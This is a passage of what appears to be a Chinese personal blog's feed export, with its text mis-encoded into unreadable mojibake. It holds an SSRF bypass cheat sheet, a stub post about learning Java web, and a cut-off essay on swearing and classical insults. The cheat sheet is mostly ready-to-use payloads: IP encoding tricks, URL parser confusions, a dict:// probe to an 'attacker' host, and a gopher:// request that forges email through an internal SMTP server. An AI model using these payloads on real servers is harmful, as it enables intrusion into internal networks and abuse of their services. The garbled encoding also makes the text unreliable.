class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:80</span><br><span class="line">http:&#x2F;&#x2F;localhost:22</span><br></pre></td></tr></table></figure><h3 id="0x01-åˆ©ç”¨ipv6"><a href="#0x01-åˆ©ç”¨ipv6" class="headerlink" title="0x01 åˆ©ç”¨ipv6"></a>0x01 åˆ©ç”¨ipv6</h3><p>åˆ©ç”¨[::]ç»•è¿‡localhost</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;[::1]&#x2F; &gt;&gt;&gt; http:&#x2F;&#x2F;127.0.0.1</span><br><span class="line">http:&#x2F;&#x2F;[::]&#x2F;  &gt;&gt;&gt;  http:&#x2F;&#x2F;0.0.0.0</span><br></pre></td></tr></table></figure><p>ä¹Ÿæœ‰ <code>http://0000::1:80/</code> è¿™ç§</p><h3 id="0x02-åˆ©ç”¨"><a href="#0x02-åˆ©ç”¨" class="headerlink" title="0x02 åˆ©ç”¨@"></a>0x02 åˆ©ç”¨@</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;example.com@127.0.0.1</span><br></pre></td></tr></table></figure><h3 id="0x03-åˆ©ç”¨çŸ­åœ°å€"><a href="#0x03-åˆ©ç”¨çŸ­åœ°å€" class="headerlink" title="0x03 åˆ©ç”¨çŸ­åœ°å€"></a>0x03 åˆ©ç”¨çŸ­åœ°å€</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;dwz.cn&#x2F;11SMa  &gt;&gt;&gt;  http:&#x2F;&#x2F;127.0.0.1</span><br></pre></td></tr></table></figure><h3 id="0x04-åˆ©ç”¨ç‰¹æ®ŠåŸŸå"><a href="#0x04-åˆ©ç”¨ç‰¹æ®ŠåŸŸå" class="headerlink" title="0x04 åˆ©ç”¨ç‰¹æ®ŠåŸŸå"></a>0x04 åˆ©ç”¨ç‰¹æ®ŠåŸŸå</h3><p>åˆ©ç”¨çš„åŸç†æ˜¯DNSè§£æ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1.xip.io&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;www.owasp.org.127.0.0.1.xip.io&#x2F;</span><br></pre></td></tr></table></figure><h3 id="0x05-åˆ©ç”¨DNSè§£æ"><a href="#0x05-åˆ©ç”¨DNSè§£æ" class="headerlink" title="0x05 åˆ©ç”¨DNSè§£æ"></a>0x05 åˆ©ç”¨DNSè§£æ</h3><p>åœ¨åŸŸåä¸Šè®¾ç½®Aè®°å½•ï¼ŒæŒ‡å‘127.0.1</p><h3 id="0x06-åˆ©ç”¨ä¿®æ”¹ä¸Šä¼ "><a href="#0x06-åˆ©ç”¨ä¿®æ”¹ä¸Šä¼ " class="headerlink" title="0x06 åˆ©ç”¨ä¿®æ”¹ä¸Šä¼ "></a>0x06 åˆ©ç”¨ä¿®æ”¹ä¸Šä¼ </h3><p>æ¯”å¦‚å¯ä»¥ä¿®æ”¹ â€œtype=fileâ€ ä¸º â€œtype=urlâ€<br>å°†å›¾ç‰‡æ–‡ä»¶ä¿®æ”¹ä¸ºURLï¼Œå³å¯èƒ½è§¦å‘ SSRF</p><h3 id="0x07-åˆ©ç”¨Enclosed-alphanumerics"><a href="#0x07-åˆ©ç”¨Enclosed-alphanumerics" class="headerlink" title="0x07 åˆ©ç”¨Enclosed alphanumerics"></a>0x07 åˆ©ç”¨Enclosed alphanumerics</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">åˆ©ç”¨Enclosed alphanumerics</span><br><span class="line">â“”â“§â“â“œâ“Ÿâ“›â“”.â“’â“â“œ  &gt;&gt;&gt;  example.com</span><br><span class="line">List:</span><br><span class="line">â‘  â‘¡ â‘¢ â‘£ â‘¤ â‘¥ â‘¦ â‘§ â‘¨ â‘© â‘ª â‘« â‘¬ â‘­ â‘® â‘¯ â‘° â‘± â‘² â‘³ </span><br><span class="line">â‘´ â‘µ â‘¶ â‘· â‘¸ â‘¹ â‘º â‘» â‘¼ â‘½ â‘¾ â‘¿ â’€ â’ â’‚ â’ƒ â’„ â’… â’† â’‡ </span><br><span class="line">â’ˆ â’‰ â’Š â’‹ â’Œ â’ â’ â’ â’ â’‘ â’’ â’“ â’” â’• â’– â’— â’˜ â’™ â’š â’› </span><br><span class="line">â’œ â’ â’ â’Ÿ â’  â’¡ â’¢ â’£ â’¤ â’¥ â’¦ â’§ â’¨ â’© â’ª â’« â’¬ â’­ â’® â’¯ â’° â’± â’² â’³ â’´ â’µ </span><br><span class="line">â’¶ â’· â’¸ â’¹ â’º â’» â’¼ â’½ â’¾ â’¿ â“€ â“ â“‚ â“ƒ â“„ â“… â“† â“‡ â“ˆ â“‰ â“Š â“‹ â“Œ â“ â“ â“ </span><br><span class="line">â“ â“‘ â“’ â““ â“” â“• â“– â“— â“˜ â“™ â“š â“› â“œ â“ â“ â“Ÿ â“  â“¡ â“¢ â“£ â“¤ â“¥ â“¦ â“§ â“¨ â“© </span><br><span class="line">â“ª â“« â“¬ â“­ â“® â“¯ â“° â“± â“² â“³ â“´ </span><br><span class="line">â“µ â“¶ â“· â“¸ â“¹ â“º â“» â“¼ â“½ â“¾ â“¿</span><br></pre></td></tr></table></figure><h3 id="0x08-åˆ©ç”¨å¥å·"><a href="#0x08-åˆ©ç”¨å¥å·" class="headerlink" title="0x08 åˆ©ç”¨å¥å·"></a>0x08 åˆ©ç”¨å¥å·</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127ã€‚0ã€‚0ã€‚1  &gt;&gt;&gt;  127.0.0.1</span><br></pre></td></tr></table></figure><h3 id="0x09-åˆ©ç”¨è¿›åˆ¶è½¬æ¢"><a href="#0x09-åˆ©ç”¨è¿›åˆ¶è½¬æ¢" class="headerlink" title="0x09 åˆ©ç”¨è¿›åˆ¶è½¬æ¢"></a>0x09 åˆ©ç”¨è¿›åˆ¶è½¬æ¢</h3><p>å¯ä»¥æ˜¯åå…­è¿›åˆ¶ï¼Œå…«è¿›åˆ¶ç­‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">115.239.210.26  &gt;&gt;&gt;  16373751032</span><br><span class="line">http:&#x2F;&#x2F;016373751032&#x2F;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæŠŠè¿™å››æ®µæ•°å­—ç»™åˆ†åˆ«è½¬æˆ16è¿›åˆ¶ï¼Œç»“æœï¼š73 ef d2 1a<br>ç„¶åæŠŠ 73efd21a è¿™åå…­è¿›åˆ¶ä¸€èµ·è½¬æ¢æˆå…«è¿›åˆ¶<br>è®°å¾—è®¿é—®çš„æ—¶å€™åŠ  0 è¡¨ç¤ºä½¿ç”¨å…«è¿›åˆ¶(å¯ä»¥æ˜¯ä¸€ä¸ª0ä¹Ÿå¯ä»¥æ˜¯å¤šä¸ª0ï¼Œè·ŸXSSä¸­å¤šåŠ å‡ ä¸ª0æ¥ç»•è¿‡è¿‡æ»¤ä¸€æ ·)ï¼Œåå…­è¿›åˆ¶åŠ 0x</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1  &gt;&gt;&gt;  http:&#x2F;&#x2F;0177.0.0.1&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1  &gt;&gt;&gt;  http:&#x2F;&#x2F;2130706433&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;192.168.0.1  &gt;&gt;&gt;  http:&#x2F;&#x2F;3232235521&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;192.168.1.1  &gt;&gt;&gt;  http:&#x2F;&#x2F;3232235777&#x2F;</span><br></pre></td></tr></table></figure><h3 id="0x0A-åˆ©ç”¨ç‰¹æ®Šåœ°å€"><a href="#0x0A-åˆ©ç”¨ç‰¹æ®Šåœ°å€" class="headerlink" title="0x0A åˆ©ç”¨ç‰¹æ®Šåœ°å€"></a>0x0A åˆ©ç”¨ç‰¹æ®Šåœ°å€</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0&#x2F;</span><br></pre></td></tr></table></figure><h3 id="0x0B-åˆ©ç”¨åè®®"><a href="#0x0B-åˆ©ç”¨åè®®" class="headerlink" title="0x0B åˆ©ç”¨åè®®"></a>0x0B åˆ©ç”¨åè®®</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Dict:&#x2F;&#x2F;</span><br><span class="line">dict:&#x2F;&#x2F;&lt;user-auth&gt;@&lt;host&gt;:&lt;port&gt;&#x2F;d:&lt;word&gt;</span><br><span class="line">ssrf.php?url&#x3D;dict:&#x2F;&#x2F;attacker:11111&#x2F;</span><br><span class="line">SFTP:&#x2F;&#x2F;</span><br><span class="line">ssrf.php?url&#x3D;sftp:&#x2F;&#x2F;example.com:11111&#x2F;</span><br><span class="line">TFTP:&#x2F;&#x2F;</span><br><span class="line">ssrf.php?url&#x3D;tftp:&#x2F;&#x2F;example.com:12346&#x2F;TESTUDPPACKET</span><br><span class="line">LDAP:&#x2F;&#x2F;</span><br><span class="line">ssrf.php?url&#x3D;ldap:&#x2F;&#x2F;localhost:11211&#x2F;%0astats%0aquit</span><br><span class="line">Gopher:&#x2F;&#x2F;</span><br><span class="line">ssrf.php?url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:25&#x2F;xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a</span><br></pre></td></tr></table></figure><h3 id="0x0C-0-0-0-0"><a href="#0x0C-0-0-0-0" class="headerlink" title="0x0C 0.0.0.0"></a>0x0C 0.0.0.0</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0&#x2F;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ–¹æ³•ä¼¼ä¹åªèƒ½åœ¨Linuxä¸‹ä½¿ç”¨ï¼ŒWindowså¹¶ä¸è®¤è¯†è¿™ä¸ªip</p><h3 id="0x0D-åˆ©ç”¨curlå’Œå…¶ä»–åº“è§£æurlçš„å·®å¼‚æ€§"><a href="#0x0D-åˆ©ç”¨curlå’Œå…¶ä»–åº“è§£æurlçš„å·®å¼‚æ€§" class="headerlink" title="0x0D åˆ©ç”¨curlå’Œå…¶ä»–åº“è§£æurlçš„å·®å¼‚æ€§"></a>0x0D åˆ©ç”¨curlå’Œå…¶ä»–åº“è§£æurlçš„å·®å¼‚æ€§</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;foo@127.0.0.1:80@www.google.com&#x2F;</span><br></pre></td></tr></table></figure><p><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf">https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf</a> æœ‰æåˆ°ï¼Œä¸è¿‡è¿™ä¸ªæ–¹æ³•åœ¨curlè¾ƒæ–°çš„ç‰ˆæœ¬é‡Œè¢«ä¿®æ‰äº†</p><p><img src="https://i.loli.net/2021/04/25/qwN3UOZzeKaXAEB.jpg"></p><h3 id="0x0E-DNS-Rebinding"><a href="#0x0E-DNS-Rebinding" class="headerlink" title="0x0E DNS Rebinding"></a>0x0E DNS Rebinding</h3><p>æ‡’ğŸ•è¡¨ç¤ºè¿˜æ²¡æï¼Œä»¥åè¡¥ä¸Š</p><h3 id="0x0F-127-1"><a href="#0x0F-127-1" class="headerlink" title="0x0F 127.1"></a>0x0F 127.1</h3><p>åœ¨ <code>[ç½‘é¼æ¯ 2020 ç„æ­¦ç»„]SSRFMe</code> è¿™é“é¢˜ä¸­æœ‰è¿™ä¹ˆä¸ªç‚¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.1&#x2F;</span><br></pre></td></tr></table></figure><ul><li><code>ip2long(&#39;127.1&#39;)</code>ä¼šè¿”å›<code>false</code>ï¼Œè¿™é‡Œå¯ä»¥ç»•è¿‡è¿‡æ»¤</li><li>ä½†æ˜¯<code>gethostbyname</code>åœ¨Linuxä¸‹ä¼šæŠŠ<code>127.1</code>å˜ä¸º<code>127.0.0.1</code>ï¼Œæ‰€ä»¥è¿™é¢˜æ˜¯æ— æ³•ä½¿ç”¨çš„ã€‚ä¸è¿‡windowsä¸‹ç»è¿‡<code>gethostbyname</code>åä¾ç„¶æ˜¯<code>127.1</code></li><li>curlæ˜¯æ”¯æŒ<code>127.1</code>è¿™æ ·çš„å†™æ³•çš„ï¼Œä½†è¿™æ ·å‘å‡ºå»çš„httpè¯·æ±‚æ˜¯æœ‰é—®é¢˜çš„ã€‚å› ä¸ºhttpåŒ…ä¸­çš„hostå¤´è¢«è®¾ä¸ºäº†<code>127.1</code>ï¼Œapacheä¼šè¿”å›ä¸€ä¸ª400 Bad Request</li><li>æ—¢ç„¶æ˜¯httpåŒ…çš„é—®é¢˜ï¼Œé‚£ä¹ˆç”¨gopheråè®®æ„é€ ä¸€ä¸ªæ­£å¸¸çš„httpè¯·æ±‚å³å¯ã€‚ä¸è¿‡è¿™å› ä¸º<code>gethostbyname</code>çš„åŸå› ï¼Œè¿™ä¸ªæ–¹æ³•è¿™é‡Œç”¨ä¸äº†</li></ul><h3 id="0x10-127-0-0-1"><a href="#0x10-127-0-0-1" class="headerlink" title="0x10 127.0.0.1."></a>0x10 127.0.0.1.</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1.</span><br></pre></td></tr></table></figure><p>ä¸è¿‡curlæ–¹æ³•ä¸æ”¯æŒè¿™ç§å†™æ³•</p><h3 id="0x11-http"><a href="#0x11-http" class="headerlink" title="0x11 http:///"></a>0x11 http:///</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;&#x2F;127.0.0.1</span><br></pre></td></tr></table></figure><p>ä¾ç„¶æ˜¯ <code>[ç½‘é¼æ¯ 2020 ç„æ­¦ç»„]SSRFMe</code></p><hr><ul><li>è¿™ä¸ªtrickä¹Ÿéå¸¸æœ‰æ„æ€ï¼Œä¹‹å‰ä¸€ç›´ä»¥ä¸ºåªæœ‰æµè§ˆå™¨æ‰ä¼šè§£æè¿™æ ·hostä¸ºç©ºçš„ç•¸å½¢urlï¼Œåœ¨På¸ˆå‚…å°å¯†åœˆåœ°æ—§å¸–é‡Œé¢Li4n0å¸ˆå‚…æåˆ°curlå’Œgitä¹Ÿä¼šæŒ‰ç…§æµè§ˆå™¨çš„æ–¹å¼è§£æï¼Œæµ‹è¯•ä¸€ä¸‹å‘ç°ç›´æ¥ç”¨curlä¼šå¡åœ¨é‚£ï¼Œä½†æ˜¯phpçš„libcurlå°±å¯ä»¥â€¦</li><li>ç”¨<code>parse_url</code>è§£æè¿™æ ·çš„ç•¸å½¢urlä¼šè¿”å›<code>false</code>ï¼Œç„¶å<code>$hostname=$url_parse[&#39;host&#39;];</code>ä¼šè¿”å›<code>null</code>ï¼ˆç¥å¥‡çš„php)</li><li>æ¥ç€åˆæ˜¯ä¸€ä¸ªwindowså’Œlinuxä¸‹phpçš„å·®å¼‚ï¼Œwindowsä¸‹<code>gethostbyname(null);</code>ä¼šè¿”å›æœ¬æœºipï¼Œå¯¼è‡´åé¢æ— æ³•ç»•è¿‡ipæ£€æµ‹ã€‚ç„¶è€Œlinuxä¸‹å¹¶æ²¡æœ‰è¿™æ ·çš„ç‰¹æ€§ï¼Œ<code>gethostbyname</code>ä¼šè¿”å›<code>null</code>ï¼Œç»•è¿‡ipæ£€æµ‹</li></ul><hr><p>æ•´ç†äº†ä¸€ä¸‹SSRFçš„ä¸€äº›tricksã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> å¥‡æŠ€æ·«å·§ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaWebå‘</title>
      <link href="2021/04/25/JavaWeb%E5%9D%91/"/>
      <url>2021/04/25/JavaWeb%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<p>å¼€ä¸ªæ–°å‘ï¼Œå­¦ Java web äº†ï¼Œæ…¢æ…¢æ›´äº†â€¦â€¦</p><hr>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è¯´è¯çš„è‰ºæœ¯</title>
      <link href="2021/04/25/%E8%AF%B4%E8%AF%9D%E7%9A%84%E8%89%BA%E6%9C%AF/"/>
      <url>2021/04/25/%E8%AF%B4%E8%AF%9D%E7%9A%84%E8%89%BA%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<p>è¯´è¯ï¼Œæ˜¯ä¸€é—¨è‰ºæœ¯ã€‚</p><h2 id="0x00-è°ˆğŸ"><a href="#0x00-è°ˆğŸ" class="headerlink" title="0x00 è°ˆğŸ"></a>0x00 è°ˆğŸ</h2><p>â€œæ±æ¯ä»Šæ™å¦ï¼Ÿâ€ï¼Œé—®å€™å¯¹æ–¹çš„æ¯äº²ï¼Œè¿™æ˜¯ä¸€ç§å¾ˆäº²åˆ‡çš„é—®å€™ï¼ŒåŒæ—¶ä¹Ÿæ˜¯ä¸€ç§å›½éª‚ï¼Œåªæ˜¯æ¸©æ–‡å°”é›…äº†ä¸€ç‚¹ï¼Œå¦‚æœè¦é€šä¿—åœ°æ¥è¯´ï¼Œâ€œä½ ğŸsiäº†â€ï¼Œâ€œè‰å°¼ğŸâ€å¯èƒ½æ›´åŠ é€‚åˆäºå›½äººã€‚</p><p>å¾ˆå–œæ¬¢è°­æ€»çš„ä¸€å¥éª‚ï¼Œâ€œå¬²ä½ å¦ˆå¦ˆåˆ«å˜â€ï¼Œå¾ˆæœ‰éŸµå‘³ï¼Œè¶Šå¬è¶Šæœ‰æ„æ€ã€‚</p><hr><p>å¬²ï¼ˆniÇoï¼‰ï¼šæ–¹è¨€ç”¨å­—ï¼Œå¾ˆå¤šæ—¶å€™ç”¨ä½œè„è¯ã€‚é€šå­¬ã€‚åœ¨æ™®é€šè¯ä¸­æ„ä¸ºæˆå¼„ã€æ…æ‰°ï¼Œæˆ–çº ç¼ ä¹‹æ„ã€‚åœ¨å†…è’™å¤ä»¥åŠæ™‹åŒ—æ–¹è¨€ä¸­ï¼Œæ„ä¸ºï¼šç¥æ°”ã€å¾—æ„ï¼Œæˆ–å¿—å¾—æ„æ»¡ä¹‹æ„ã€‚ç²¤è¯­ä¸­æ„ä¸ºï¼šç”Ÿæ°”ã€‚</p><hr><p>â€œå¬²~â€ï¼Œâ€œæˆ‘å¬²â€ï¼Œå¹¶ä¸æ˜¯ç”¨ä»¥éª‚äººï¼Œå¤šç”¨äºè¡¨ç¤ºæƒŠå¥‡ä¹‹æ„Ÿï¼Œæ¯”å¦‚â€œæˆ‘å¬²ï¼Œè¿™ä¹ˆå±Œçš„ğŸï¼Ÿâ€ï¼Œæˆ‘ä»¬é‚£ä¸€è¾¹çš„å¬²è¯»ä½œ<code>nia</code>ï¼Œâ€œæˆ‘å¬²deä½ liå¨˜â€ï¼Œå¦‚æ­¤ä½œä¸ºéª‚äººçš„è¯ã€‚</p><p>è¿™å°±æ˜¯å¾ˆç¥å¥‡çš„ä¸€ä¸ªåœ°æ–¹ï¼Œä¿—è¯è¯´éª‚äººä¸éª‚å®¶äººï¼Œé‚£ä¸ºç”šä¹ˆå¾ˆå¤šæ—¶å€™æˆ‘ä»¬å¹¶ä¸æ˜¯ç›´æ¥éª‚å¯¹æ–¹â€œä½ æ˜¯ä¸æ˜¯ğŸ•å•Šï¼Œä½ æ˜¯ä¸æ˜¯ğŸ–å•Šâ€è¿™ä¸€ç±»çš„ï¼Œè€Œæ˜¯ç›´æ¥ä¸Šå‡åˆ°äº²äººå‘¢ï¼Œâ€œä½ ğŸä»Šæ™šbissï¼Œbussä¸æ˜¯äº²ğŸâ€è¿™ä¸€ç±»çš„ã€‚</p><p>å¯èƒ½æ˜¯å› ä¸ºå¤ä»£éƒ½æœ‰ç½ªè‡³æ ªè¿ä¹æ—ï¼Œå¯¹æ–¹çš„è¡Œä¸ºå·²ç»è¶³å¤Ÿå¯æ¨ï¼Œä»¤äººè¿‡äºä¸æ»¡ï¼Œæ‰€ä»¥ç›´æ¥å¯¹å¯¹æ–¹çš„äº²äººè¿›è¡Œæ”»å‡»ï¼Œä¼šç»™äººä¸€ç§æ‰“å‡ºçœŸå®ä¼¤å®³çš„æ„Ÿè§‰ï¼Œæ¯•ç«Ÿå¯¹æ–¹äº‹æƒ…éƒ½åšäº†ï¼Œè¿˜ä¼šåœ¨ä¹ä½ éª‚ä»–å—ã€‚</p><p>è¿˜æœ‰ä¸€ä¸ªå¾ˆæœ‰æ„æ€çš„è¯´æ³•</p><hr><p>â€œæ‹Ÿå¦ˆæ­»äº†â€</p><p>æˆ‘æ‰€éª‚çš„è¿™ä¸ªğŸå¹¶ä¸çœŸçš„å°±æ˜¯ä½ çš„ğŸï¼Œè€Œæ˜¯æˆ‘æ‰€åˆ›é€ å‡ºçš„ä¸€ä¸ªè™šæ‹Ÿçš„ğŸï¼Œåªæ˜¯ä¸ºäº†è®©æˆ‘å¯ä»¥éª‚å¾—æ›´åŠ ç—›å¿«ï¼Œä½†æ˜¯è™½ç„¶æˆ‘ç°åœ¨è¿™ä¹ˆéª‚ç€ï¼Œä½†æ˜¯å¹³æ—¶æ—¥å¸¸ç”Ÿæ´»ä¸­æˆ‘è§åˆ°äº†ä½ çš„ğŸæˆ‘è¿˜æ˜¯ä¼šäº²åˆ‡åœ°å–Šä¸€å¥â€œé˜¿å§¨å¥½â€çš„ã€‚</p><hr><p>å¾ˆå¤©æ‰ï¼Œå…„å¼Ÿï¼Œè¿™ä¸ªè¯æ±‡çš„åˆ›é€ çœŸçš„æ˜¯éå¸¸çµæ€§ï¼Œå…¶å®å¤§å®¶åœ¨å¯¹éª‚çš„æ—¶å€™å¹¶ä¸æ˜¯çœŸçš„ä¸ºäº†å»è¯…å’’å¯¹æ–¹â€œğŸæ­»äº†â€ï¼Œè€Œæ˜¯ä¸ºäº†é€šè¿‡éª‚å¯¹æ–¹çš„ç›´ç³»è¡€ç¼˜å…³ç³»çš„äººï¼Œæ¥ä½¿è‡ªå·±çš„æ°”åŠ¿è¾¾åˆ°ä¸€ä¸ªæ›´é«˜çš„åœºåˆï¼Œæ¥ä½¿è‡ªå·±åœ¨ä¸€åœºéª‚æˆ˜ä¸­â€œå–èƒœâ€ã€‚</p><p><del>å¥½äº†ï¼Œå…ˆåˆ°è¿™é‡Œï¼Œä¸‹ä¸€æ¬¡æˆ‘ä»¬å°†å“æä¸€äº›ä¸å¸¦è„å­—çš„éª‚äººè¯´æ³•ã€‚ï¼ˆè¯¾è®¾å»äº†ï¼Œé€ƒ</del></p><h2 id="0x01-ä¼˜é›…çš„å¤äºº"><a href="#0x01-ä¼˜é›…çš„å¤äºº" class="headerlink" title="0x01 ä¼˜é›…çš„å¤äºº"></a>0x01 ä¼˜é›…çš„å¤äºº</h2><p>ä¸å¸¦è„å­—å…ˆå§‘ä¸”ä¸è°ˆï¼Œæ­¤åˆ»çš„å…´è‡´åœç•™åœ¨å¤äººçš„ä¼˜é›…ä¹‹é—´ï¼Œæˆ‘ä»¬æ¥è°ˆè°ˆå¤äººéª‚äººçš„ä¼˜é›…ä¹‹å¤„ã€‚</p><p>æœ‰ä¸€è¯´ä¸€å¥¥ï¼Œè¯´è„è¯å…¶å®æ˜¯æ£€éªŒå‹è°Šçš„é‡è¦æ ‡å‡†ï¼Œè„è¯è¶Šå¤šï¼Œè¶Šäº²å¯†ï¼Œå› ä¸ºè„è¯å¾€å¾€æ˜¯è¡¨è¾¾æ„Ÿæƒ…çš„æœ€ç›´æ¥é€”å¾„ï¼Œé‚£ä¹ˆå¤äººåˆæ˜¯å¦‚ä½•è¯´è„è¯çš„å‘¢ï¼Ÿå¦‚è‹¥ä½ åªèƒ½è¯´å‡ºâ€œğŸ‘´ä»æœªè§è¿‡å¦‚æ­¤ åšé¢œæ— è€»ä¹‹äººâ€ï¼Œé‚£ç¡®å®åº”è¯¥å¥½å¥½å­¦ä¹ ä¸€ä¸‹äº†ã€‚</p><p>åœ¨ç§¦æ±‰æ—¶æœŸï¼Œä½ ä¼šå‘ç°é‚£ä¸ªæ—¶ä»£çš„äººéª‚äººè¿˜æ˜¯å¾ˆæ¸©å’Œçš„ï¼Œè€Œä¸”éª‚äººéœ€è¦ä¸€å®šçš„çŸ¥è¯†ï¼Œå› ä¸ºå½“æ—¶ä¹¦é¢è¯­å’Œå£è¯­æ¯”è¾ƒæ¥è¿‘ã€‚ä¾‹å¦‚å¤§å®¶ä»¥å‰éƒ½å­¦è¿‡çš„ã€Šé¸¿é—¨å®´ã€‹ï¼Œé¡¹ç¾½ä¸å¬èŒƒå¢çš„åŠå‘Šï¼Œæ”¾èµ°äº†åˆ˜é‚¦ï¼Œæ€¥å¾—èŒƒå¢å¤§éª‚ï¼šâ€œå”‰ï¼Œç«–å­ä¸è¶³ä¸è°‹ï¼â€æ„æ€å°±æ˜¯â€œä¸æƒ³å†è·Ÿä½ è¿™ä¸ªå¼±æ™ºç©äº†ã€‚â€</p><p>å½“ç„¶ä¹Ÿæœ‰æ›´é«˜çº§ä¸€ç‚¹çš„ï¼Œå»ºå®‰ä¸ƒå­é™ˆç³æ›¾å†™ã€Šè®¨è´¼æª„æ–‡ã€‹ï¼Œç—›éª‚æ›¹æ“ç¥–å®—ä¸‰ä»£ï¼Œå¬å¾—æ›¹æ“ä¸€æ„£ä¸€æ„£ï¼Œä½ éª‚æˆ‘å¯ä»¥ç†è§£ï¼Œç¥–å®—ä¸‰ä»£éƒ½éª‚äº†æ˜¯ä»€ä¹ˆæ“ä½œï¼Œæ›´éªšçš„æ˜¯æŠŠæ›¹æ“å½“æ—¶çš„å¤´é£ä¸€ä¸‹å­æ²»å¥½äº†ï¼Œè¿™ä¸æ˜¯é€†å¤©æˆ‘éšä½ æ€ä¹ˆè¯´ã€‚</p><p>è´´ä¸€æ³¢åŸæ–‡ï¼ŒğŸ‘´ç”šæ˜¯å–œæ¬¢è¿™æ–‡é‡‡</p><blockquote><p>ç›–é—»æ˜ä¸»å›¾å±ä»¥åˆ¶å˜ï¼Œå¿ 